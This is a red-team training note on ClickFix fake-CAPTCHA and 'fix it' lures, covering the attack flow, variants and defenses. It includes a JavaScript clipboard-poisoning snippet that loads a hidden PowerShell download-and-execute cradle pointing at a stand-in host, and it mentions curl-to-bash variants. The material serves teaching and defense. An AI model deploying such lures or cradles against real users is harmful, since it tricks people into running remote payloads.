---
tags: [c2, red-team, initial-access, social-engineering, vapt]
difficulty: intermediate
module: "101 - Red Team Initial Access and Payload Delivery"
topic: "101.03 ClickFix and Fake Verification Lures"
---

# ClickFix and Fake Verification Lures

## Introduction
**ClickFix** is a social-engineering technique (heavily abused in real campaigns from ~2024 onward) that gets the victim to **run the attacker's command themselves** by disguising it as a routine "fix" or "verification" step. Instead of delivering a file to be detonated, the lure presents a fake error, CAPTCHA, or "verify you are human" prompt with instructions like *"press Win+R, paste this, and hit Enter"* — and the clipboard has been silently loaded with a malicious command. Because **the user pastes and executes the payload manually in a trusted shell**, there is no malicious download to scan and no exploit — it sidesteps most file-based and browser-exploit defenses entirely. It is the spiritual successor to fake-update lures and is extremely effective.

## How ClickFix Works
```text
+---------------------------------------------------------------+
|                      CLICKFIX FLOW                           |
+---------------------------------------------------------------+
|  Victim lands on lure page (phishing link / malvertising /    |
|  compromised site / fake CAPTCHA "Verify you are human")      |
|        |  page JS silently copies a command to the CLIPBOARD  |
|        v                                                       |
|  Page instructs:  "1) Press Win+R   2) Ctrl+V   3) Enter"     |
|        |  (or 'open Terminal and paste' on macOS/Linux)        |
|        v                                                       |
|  Victim pastes -> a PowerShell/cmd/bash one-liner runs        |
|        |  download cradle -> fetch + execute payload          |
|        v                                                       |
|  C2 implant / infostealer executes — NO file was "delivered"  |
+---------------------------------------------------------------+
```

## The Clipboard-Poisoning Trick
The page uses JavaScript to write to the clipboard the moment the victim interacts (e.g. clicks the fake "Verify"/"Fix" button):
```javascript
// on click of the fake "I'm not a robot" / "Fix it" button
navigator.clipboard.writeText(
  'powershell -w hidden -c "iwr https://evil/x.ps1 | iex"'   // hidden cradle
);
// page then shows step-by-step "verification" instructions
```
What the victim *sees* in instructions is often a benign-looking token (e.g. a fake "ray ID" or "verification code"); the *actual* clipboard contents are the command, sometimes padded with spaces/comments so the malicious part scrolls out of view in the Run box.

## Common Variants
- **Fake CAPTCHA / "Verify you are human"** (the most common 2024-2025 form).
- **Fake browser/Windows update or error** ("To fix this display issue, run...").
- **Fake meeting/document fix** ("Microsoft Teams needs you to run this to join").
- **PowerShell (Win+R / Terminal)**, **mshta**, or **`ms-` protocol** execution paths.
- macOS/Linux variants instruct opening **Terminal** and pasting a `curl | bash`.

## Why It's Effective
- **No payload to scan**: the malicious content is a clipboard string + instructions; the actual code is fetched by the user-run cradle over HTTPS.
- **No exploit / no macro**: bypasses browser sandbox, macro blocking, and attachment filtering.
- **User-initiated execution** in a trusted shell defeats many "untrusted process" heuristics — the parent is `explorer.exe`/Run dialog.
- Exploits habituation to CAPTCHAs and "just run this to fix it" support flows.

## Why It Matters
ClickFix has rapidly become a top initial-access technique precisely because it routes around the file/exploit defenses the industry spent years building. For red teams it's a high-success, low-infrastructure lure; for defenders it's a hard-to-block behavior that lives in user education and endpoint command-line telemetry.

## Defensive Notes
- **User awareness**: teach that *no legitimate site ever asks you to press Win+R / open Terminal and paste a command* to "verify" or "fix" anything.
- **Endpoint detection**: alert on `explorer.exe`/Run-dialog spawning PowerShell/mshta/cmd with download cradles; enable PowerShell **script-block + module logging**; flag `iwr|iex`, `curl|bash`, base64-encoded one-liners.
- **Hardening**: constrained-language mode for PowerShell, ASR rules, disable the Run box / clipboard-paste-to-shell for standard users where feasible.
- Monitor clipboard-write events on suspicious pages (some browser/EDR tooling can).

## Related Notes
- [[01 - Phishing Tradecraft and Pretexting]]
- [[05 - Windows Download and Execute Cradles]]
- [[02 - HTML Smuggling]]
- [[37 - AMSI Bypass Techniques]]
